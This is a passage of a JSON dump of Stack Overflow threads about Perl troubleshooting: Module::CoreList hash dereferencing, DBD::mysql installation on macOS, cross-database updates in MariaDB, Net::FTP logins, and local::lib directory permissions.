"display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "is_accepted": true, "score": 3, "last_activity_date": 1574341318, "creation_date": 1574341318, "answer_id": 58975706, "question_id": 58975473, "link": "https://stackoverflow.com/questions/58975473/hash-keys-are-not-able-to-translate-to-an-array/58975706#58975706", "title": "Hash keys are not able to translate to an array", "body": "<p>As per <a href=\"https://metacpan.org/pod/distribution/Module-CoreList/lib/Module/CoreList.pod\" rel=\"nofollow noreferrer\">the documentation of <code>Module::CoreList</code></a>, <code>%Module::CoreList::version</code> returns a <em>a hash of hashes that is keyed on perl version</em>. So each element of the hash is a hash reference, not a hash. </p>\n\n<p>You need to <em>dereference</em> the hash reference, by putting a <code>%</code> in front of it, as follows:</p>\n\n<pre><code>@m = sort keys %{ $Module::CoreList::version{5.014002} };\n</code></pre>\n"}], "owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 58975706, "answer_count": 1, "score": 1, "last_activity_date": 1590929478, "creation_date": 1574340495, "last_edit_date": 1590929478, "question_id": 58975473, "link": "https://stackoverflow.com/questions/58975473/hash-keys-are-not-able-to-translate-to-an-array", "title": "Hash keys are not able to translate to an array", "body": "<p>I have just this simple code of perl:</p>\n\n<pre><code>#!/usr/bin/perl\nuse Module::CoreList;\nuse local::lib;\n#print ref( $Module::CoreList::version{5.014002});\n@m = sort keys $Module::CoreList::version{5.014002};\n</code></pre>\n\n<p>So that I know some modules of particular version. But when tried to run:</p>\n\n<pre><code>Experimental keys on scalar is now forbidden at ./a line 5.\nType of arg 1 to keys must be hash or array (not hash element) at ./a line 5, near \"};\"\nExecution of ./a aborted due to compilation errors.\n</code></pre>\n\n<p>But why does it take <code>$Module::CoreList::version{5.014002}</code> as scalar? When the type is hash (well array when you want to know keys of that hash)?</p>\n"}, {"tags": ["mysql", "macos", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574339307, "post_id": 58974618, "comment_id": 104203148, "body": "The pertinent bit is <code>wrong result: &#39;mysqlclient&#39;, &#39;ssl&#39;, &#39;crypto&#39;</code> (and maybe things that came before that). Not sure what produces that or what it means. Possible duplicate of <a href=\"https://stackoverflow.com/q/53865612/589924\">stackoverflow.com/q/53865612/589924</a>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574339399, "post_id": 58974618, "comment_id": 104203218, "body": "Also found this: <a href=\"https://github.com/perl5-dbi/DBD-mysql/issues/161#issuecomment-449962061\" rel=\"nofollow noreferrer\">github.com/perl5-dbi/DBD-mysql/issues/&hellip;</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574339496, "post_id": 58974618, "comment_id": 104203278, "body": "This might be the correct solution: <a href=\"https://github.com/perl5-dbi/DBD-mysql/issues/161#issuecomment-531742015\" rel=\"nofollow noreferrer\">github.com/perl5-dbi/DBD-mysql/issues/&hellip;</a>"}], "owner": {"reputation": 156, "user_id": 6103872, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T8q0m.png?s=128&g=1", "display_name": "netajik", "link": "https://stackoverflow.com/users/6103872/netajik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 134, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1574397718, "creation_date": 1574337793, "last_edit_date": 1574397718, "question_id": 58974618, "link": "https://stackoverflow.com/questions/58974618/unable-to-connect-mysql-5-8-using-perl5-18-on-macos-mojave-version-10-14-6", "title": "unable to connect mysql 5.8 using perl5.18 on macOS Mojave version 10.14.6", "body": "<p>I want to connect the <code>MySQL</code> client by using below <code>perl5.18</code> script on <code>macOS</code>.</p>\n\n<p>File name: <code>db.pl</code></p>\n\n<pre><code>#!usr/bin/perl\n\nuse DBI;\nuse strict;\n\nmy $driver = \"mysql\";\nmy $database = \"test\";\nmy $dsn = \"DBI:$driver:database=$database\";\nmy $userid = \"root\";\nmy $password = \"qawseder123\";\n\nmy $dbh = DBI-&gt;connect($dsn, $userid, $password ) or die $DBI::errstr;\n\nmy $sth = $dbh-&gt;prepare(\"INSERT INTO test\n                       (first_name, last_name, sex, age)\n                         values\n                       ('john', 'poul', 1, 30)\");\n$sth-&gt;execute() or die $DBI::errstr;\n$sth-&gt;finish();\n$dbh-&gt;commit or die $DBI::errstr;\n</code></pre>\n\n<p>When I execute <strong><code>perl db.pl</code></strong>, it gives below error.</p>\n\n<blockquote>\n  <p>install_driver(mysql) failed: Can't locate DBD/mysql.pm in @INC (you may need to install the DBD::mysql module) (@INC contains: /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4/darwin-thread-multi-2level /Library/Perl/Updates/5.18.4 /System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at (eval 4) line 3.\n  Perhaps the DBD::mysql perl module hasn't been fully installed,\n  or perhaps the capitalisation of 'mysql' isn't right.\n  Available drivers: DBM, ExampleP, File, Gofer, Mem, Proxy, SQLite, Sponge.\n   at db.pl line 12.</p>\n</blockquote>\n\n<p>To resolve above error below commands are executed.</p>\n\n<p><strong><code>perl -MCPAN -e shell</code></strong></p>\n\n<p><strong><code>install DBD::mysql</code></strong></p>\n\n<p>But it gives below error when I execute <strong><code>install DBD::mysql</code></strong>.</p>\n\n<blockquote>\n  <p>wrong result: 'mysqlclient', 'ssl', 'crypto'\n  Warning: No success on command[/usr/bin/perl Makefile.PL]\n  'YAML' not installed, will not store persistent state\n    DVEEDEN/DBD-mysql-4.050.tar.gz\n    /usr/bin/perl Makefile.PL -- NOT OK\n  Running make test\n    Make had some problems, won't test\n  Running make install\n    Make had some problems, won't install\n  Failed during this command:\n   DVEEDEN/DBD-mysql-4.050.tar.gz               : writemakefile NO '/usr/bin/perl Makefile.PL' returned status 512.</p>\n</blockquote>\n\n<p>Would you guide me?</p>\n"}, {"tags": ["sql", "perl", "mariadb", "dbi"], "comments": [{"owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "edited": false, "score": 0, "creation_date": 1574330085, "post_id": 58971574, "comment_id": 104197661, "body": "Your logic is unclear. Please provide sample data from both tables as well as expected results, and an explanation of the logic."}, {"owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", "display_name": "GMB", "link": "https://stackoverflow.com/users/10676716/gmb"}, "edited": false, "score": 0, "creation_date": 1574330120, "post_id": 58971574, "comment_id": 104197685, "body": "Are both databases hosted on the same server? If so, it should be possible to write a sql query that directly updates one table from the other."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1574330279, "post_id": 58971574, "comment_id": 104197789, "body": "Your update query is invalid sql.  the IN operator should be followed by a comma separated list of values or a subquery."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1574330353, "post_id": 58971574, "comment_id": 104197840, "body": "So you want to pull data from one database and insert it into the other. Your Perl looks fine. Your SQL is incomplete. This is the same as if it were one database. You need to get the host ids out of your <code>@row</code>, and have a placeholder <code>?</code> in your UPDATE query."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574331815, "post_id": 58971574, "comment_id": 104198795, "body": "You&#39;ve already asked several similar questions. Have you understood any of the answers you were given?"}, {"owner": {"reputation": 25, "user_id": 11508193, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-vYP2e4qxXL8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rc6Worv7lks_KJFqykkxDWM-H0ebg/mo/photo.jpg?sz=128", "display_name": "sdgr hjgh", "link": "https://stackoverflow.com/users/11508193/sdgr-hjgh"}, "edited": false, "score": 0, "creation_date": 1574332520, "post_id": 58971574, "comment_id": 104199218, "body": "this is not same question, now i use two database worldmap and zabbix"}, {"owner": {"reputation": 12075, "user_id": 1137055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59d7b43b9eb7d01bd8f7e51febe6053c?s=128&d=identicon&r=PG", "display_name": "dgw", "link": "https://stackoverflow.com/users/1137055/dgw"}, "edited": false, "score": 0, "creation_date": 1574337033, "post_id": 58971574, "comment_id": 104201828, "body": "What is your problem? What error messages do you get? In the edited version of the question you do not use two databases."}, {"owner": {"reputation": 25, "user_id": 11508193, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-vYP2e4qxXL8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rc6Worv7lks_KJFqykkxDWM-H0ebg/mo/photo.jpg?sz=128", "display_name": "sdgr hjgh", "link": "https://stackoverflow.com/users/11508193/sdgr-hjgh"}, "edited": false, "score": 0, "creation_date": 1574344011, "post_id": 58971574, "comment_id": 104205939, "body": "the problem is $db1 is for database 1, but $query3 use database 1 and database 2"}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1574560692, "post_id": 58971574, "comment_id": 104275444, "body": "Are the <code>IP</code> values the same?"}], "answers": [{"tags": [], "owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "is_accepted": false, "score": 0, "last_activity_date": 1574560700, "creation_date": 1574560700, "answer_id": 59014000, "question_id": 58971574, "link": "https://stackoverflow.com/questions/58971574/perl-update-from-two-databases/59014000#59014000", "title": "perl - update from two databases", "body": "<p>Use a single connection.  Reference tables using the db.table syntax.</p>\n"}], "owner": {"reputation": 25, "user_id": 11508193, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-vYP2e4qxXL8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rc6Worv7lks_KJFqykkxDWM-H0ebg/mo/photo.jpg?sz=128", "display_name": "sdgr hjgh", "link": "https://stackoverflow.com/users/11508193/sdgr-hjgh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1574560700, "creation_date": 1574328912, "last_edit_date": 1574330722, "question_id": 58971574, "link": "https://stackoverflow.com/questions/58971574/perl-update-from-two-databases", "title": "perl - update from two databases", "body": "<p>i have two databases in mariadb and i want to update two databases,</p>\n\n<pre><code>#Connect to the database1.\n     my $db1 = DBI-&gt;connect(\"DBI:mysql:database=db1;host=ip\",\n     \"login\", 'paswword',\n     {'RaiseError' =&gt; 1});\n\n #Connect to the database2.\n     my $db2 = DBI-&gt;connect(\"DBI:mysql:database=db2;host=ip\",\n     \"login\", 'password',\n     {'RaiseError' =&gt; 1});\n</code></pre>\n\n<h1>this query not work</h1>\n\n<pre><code>my $query3 = $db1-&gt;prepare(\"\nUPDATE worldmap.worldmap_table t1\nSET t1.severity = 1000\nWHERE t1.host IN\n(SELECT h.name\nFROM host_inventory as i, hosts as h WHERE i.hostid=h.hostid  and h.available=1)\");\n\n$query3-&gt;execute;\n</code></pre>\n\n<p>thanks for your response</p>\n"}, {"tags": ["perl", "ftp"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574325298, "post_id": 58970359, "comment_id": 104194726, "body": "The first argument (<code>$host</code>) is the name/address of the machine (and optionally a port). What you gave isn&#39;t allowed. If you need to switch directory, there&#39;s a method you can call to do that once you&#39;re connected."}, {"owner": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574359930, "post_id": 58970359, "comment_id": 104215240, "body": "Do you know how can i access the &quot;newDirectory&quot; folder that has a different credentials from the server?"}], "answers": [{"comments": [{"owner": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "edited": false, "score": 0, "creation_date": 1574333301, "post_id": 58970529, "comment_id": 104199700, "body": "Thanks for the info, pmqs.  I already tried this code and I cant access the host since it has a different credentials."}, {"owner": {"reputation": 1323, "user_id": 2030808, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iRrvi.png?s=128&g=1", "display_name": "pmqs", "link": "https://stackoverflow.com/users/2030808/pmqs"}, "reply_to_user": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "edited": false, "score": 1, "creation_date": 1574333898, "post_id": 58970529, "comment_id": 104200065, "body": "@Pentagon, I assume you verified that you can access the server using the command line ftp program?"}, {"owner": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "edited": false, "score": 0, "creation_date": 1574359788, "post_id": 58970529, "comment_id": 104215177, "body": "@pqms, i can access the host server using the first credentials. But my problem is, I can&#39;t access the newDirectory since it has a different credentials. Do you have any way to get to the newDirectory?"}, {"owner": {"reputation": 1323, "user_id": 2030808, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iRrvi.png?s=128&g=1", "display_name": "pmqs", "link": "https://stackoverflow.com/users/2030808/pmqs"}, "reply_to_user": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "edited": false, "score": 0, "creation_date": 1574412698, "post_id": 58970529, "comment_id": 104232146, "body": "I&#39;m not clear what you&#39;ve done.  How exactly did you create &amp; secure newDirectory? If you use the commandline FTP program. how do you access newDirectory? If you can&#39;t get access to newDirectory using the FTP command, you aren&#39;t going to be able to do it via Net::FTP."}], "tags": [], "owner": {"reputation": 1323, "user_id": 2030808, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iRrvi.png?s=128&g=1", "display_name": "pmqs", "link": "https://stackoverflow.com/users/2030808/pmqs"}, "is_accepted": false, "score": 2, "last_activity_date": 1574325534, "creation_date": 1574325534, "answer_id": 58970529, "question_id": 58970359, "link": "https://stackoverflow.com/questions/58970359/perl-same-server-different-credentials/58970529#58970529", "title": "PERL: Same server different credentials", "body": "<p>Below is from the Net::FTP man page</p>\n\n<pre><code>   new ([ HOST ] [, OPTIONS ])\n       This is the constructor for a new Net::FTP object. \"HOST\" is the\n       name of the remote host to which an FTP connection is required.\n</code></pre>\n\n<p>The string <code>\"x.x.x.x/newDirectory/</code>\" is not a valid host name.</p>\n\n<p>You need to log into the FTP server, then change directory to <code>newDirectory</code>. The <code>cwd</code> method is what you need to use.</p>\n\n<pre><code>   cwd ( [ DIR ] )\n       Attempt to change directory to the directory given in $dir.  If\n       $dir is \"..\", the FTP \"CDUP\" command is used to attempt to move up\n       one directory. If no directory is given then an attempt is made to\n       change the directory to the root directory.\n</code></pre>\n\n<p>Try doing something like this (untested)</p>\n\n<pre><code>use Net::FTP;\n\nmy $host=\"x.x.x.x\";\n$ftp = Net::FTP-&gt;new-&gt;($host,Debug =&gt; 0) or die;\n$ftp-&gt;login(\"username2\",'password2') or die;\n$ftp-&gt;cwd(\"newDirectory\");\n</code></pre>\n"}], "owner": {"reputation": 58, "user_id": 6939974, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/tXUVq.jpg?s=128&g=1", "display_name": "Pentagon", "link": "https://stackoverflow.com/users/6939974/pentagon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1574325534, "creation_date": 1574324817, "question_id": 58970359, "link": "https://stackoverflow.com/questions/58970359/perl-same-server-different-credentials", "title": "PERL: Same server different credentials", "body": "<p>I have a secured ftp with the following credentials:</p>\n\n<pre><code>host: x.x.x.x\nusername: username1\npassword: password1\n</code></pre>\n\n<p>After this, I have created a directory in the ftp and secured it with a different credentials:</p>\n\n<pre><code>path: x.x.x.x/newDirectory/\nusername: username2\npassword: password2\n</code></pre>\n\n<p>I've been trying to access my newDirectory folder using the credentials provided with the perl code below:</p>\n\n<pre><code>use Net::FTP;\n\nmy $host=\"x.x.x.x/newDirectory/\";\n$ftp = Net::FTP-&gt;new-&gt;($host,Debug =&gt; 0) or die;\n$ftp-&gt;login(\"username2\",'password2') or die;\n</code></pre>\n\n<p>I have been prompted by an error \"Bad hostname\".</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574323325, "post_id": 58969784, "comment_id": 104193719, "body": "Does any part of the path already exist?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574323526, "post_id": 58969784, "comment_id": 104193815, "body": "Does <code>&#47;home&#47;shepherd&#47;perl5&#47;lib</code> exist? Do you own it? Do you have read+write+execute permissions to it? Does <code>&#47;home&#47;shepherd&#47;perl5&#47;lib&#47;perl5</code> exist? Do you own it? Do you have read+write+execute permissions to it?"}, {"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574324288, "post_id": 58969784, "comment_id": 104194178, "body": "@ikegami yes I do. Both - they exists and I own them."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574324337, "post_id": 58969784, "comment_id": 104194201, "body": "According to the listing you added, <code>root</code> owns them. But aren&#39;t you running as <code>shepherd</code>?"}, {"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574324573, "post_id": 58969784, "comment_id": 104194339, "body": "yes the path to dir <code>&#47;usr&#47;share&#47;perl5&#47;local&#47;lib.pm</code> does exists. But the output of error:  No such file or directory at <code>lib&#47;local&#47;lib.pm</code> line 717. I dont know what that path is the <code>lib&#47;local&#47;lib.pm</code> .. is it the same i have mationed? or where does is starts at?"}, {"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574324599, "post_id": 58969784, "comment_id": 104194354, "body": "@ikegami i do, but i am root as well"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574324943, "post_id": 58969784, "comment_id": 104194550, "body": "&quot;You&quot; meant &quot;The user running the program&quot;. Not someone other user, even if you can become that user. It wasn&#39;t root that was running the program, so it doesn&#39;t matter what permissions root has."}], "answers": [{"comments": [{"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574325608, "post_id": 58970373, "comment_id": 104194894, "body": "Well that sucks, i just made <code>sudo</code> for that command and it magically starts working, but how should i have known that before?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574325814, "post_id": 58970373, "comment_id": 104194994, "body": "You shouldn&#39;t create files a user doesn&#39;t own or at least have rights to in their own home directory. You should have known because the downsides of this are rather obvious. Well, if they weren&#39;t before, they are now. /// I hope you meant you ran <code>chown</code> as root to fix the bad permissions, not <code>Makefile.PL</code>."}, {"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574340196, "post_id": 58970373, "comment_id": 104203668, "body": "I just simpy run it as admin with sudo precommand. Did not change any permissions with chmod, but does it matter?"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1574324886, "creation_date": 1574324886, "answer_id": 58970373, "question_id": 58969784, "link": "https://stackoverflow.com/questions/58969784/cannot-create-directory-for-locallib/58970373#58970373", "title": "cannot create directory for &#39;local::lib&#39;", "body": "<p>local::lib misreports the error reason. In this particular case, the problem is that the user running the program (<code>shepherd</code>) doesn't have permission to write to <code>/home/shepherd/perl5/lib/perl5</code> in order to create <code>/home/shepherd/perl5/lib/perl5/5.28.0</code>.</p>\n\n<p>The user will need to be granted the ability to write to that directory. This should probably be done by changing the ownership of the files from <code>root</code> to <code>shepherd</code>.</p>\n\n<pre><code>chown -R shepherd:shepherd ~/perl5\n</code></pre>\n"}], "owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 108, "favorite_count": 0, "accepted_answer_id": 58970373, "answer_count": 1, "score": 0, "last_activity_date": 1574324886, "creation_date": 1574322577, "last_edit_date": 1574324030, "question_id": 58969784, "link": "https://stackoverflow.com/questions/58969784/cannot-create-directory-for-locallib", "title": "cannot create directory for &#39;local::lib&#39;", "body": "<p>I have installed local::lib from cpan. But the manually one more again to make bootstrap - <code>perl Makefile.PL \u2212\u2212bootstrap</code>. And although I have already a file <code>lib.pm</code> here <code>/usr/share/perl5/local/lib.pm</code>, it when trying to bootstrap it (with the command mentioned above) this error rises:</p>\n\n<pre><code>Loading internal logger. Log::Log4perl recommended for better logging\nAttempting to create directory /home/shepherd/perl5\nUnable to create /home/shepherd/perl5/lib/perl5/5.28.0: No such file or directory at /usr/share/perl5/local/lib.pm line 717.\n</code></pre>\n\n<p>So if I have installed the module, and have it may dir, why the bootstrap cannot create <code>/home/shepherd/perl5/lib/perl5/5.28.0</code> ?</p>\n\n<pre><code>I have and own this files:\nls -l ~/perl5\ndrwxrwxr-x 2 root root 4096 Nov 18 23:03 bin\ndrwxrwxr-x 3 root root 4096 Oct 28 18:52 lib\ndrwxrwxr-x 4 root root 4096 Oct 28 18:52 man\n\nls -l ~/perl5/lib\ndrwxrwxr-x 25 root root 4096 Nov 21 08:56 perl5\n\nls -l ~perl5/lib/perl5\ndrwxrwxr-x  2 root root  4096 Nov 20 19:54 B\ndrwxrwxr-x  3 root root  4096 Nov 21 08:56 Business\ndrwxrwxr-x  3 root root  4096 Oct 28 19:08 Class\ndrwxrwxr-x  2 root root  4096 Nov 20 19:54 Config\ndrwxrwxr-x  3 root root  4096 Oct 28 19:09 Devel\ndrwxrwxr-x  2 root root  4096 Oct 28 19:08 Dist\ndrwxrwxr-x  3 root root  4096 Nov 20 19:54 File\ndrwxrwxr-x  2 root root  4096 Nov 20 19:54 Hook\n-r--r--r--  1 root root 42537 Feb 18  2018 Importer.pm\ndrwxrwxr-x  3 root root  4096 Oct 28 19:10 IPC\ndrwxrwxr-x  3 root root  4096 Nov 18 23:03 Log\ndrwxrwxr-x  3 root root  4096 Nov 20 20:48 Mac\ndrwxrwxr-x  3 root root  4096 Oct 28 19:09 MIME\ndrwxrwxr-x  3 root root  4096 Oct 28 18:52 Module\n-r--r--r--  1 root root   967 Sep  6 16:40 ok.pm\ndrwxrwxr-x  2 root root  4096 Nov 19 23:13 OLE\ndrwxrwxr-x  3 root root  4096 Oct 28 19:08 Perl\ndrwxrwxr-x  3 root root  4096 Oct 28 19:09 POD2\ndrwxrwxr-x  2 root root  4096 Oct 28 19:09 Scope\ndrwxrwxr-x  2 root root  4096 Nov 20 19:56 String\ndrwxrwxr-x  2 root root  4096 Nov 20 19:54 Task\ndrwxrwxr-x  3 root root  4096 Oct 28 19:09 Term\ndrwxrwxr-x  9 root root  4096 Nov 20 19:54 Test\ndrwxrwxr-x 10 root root  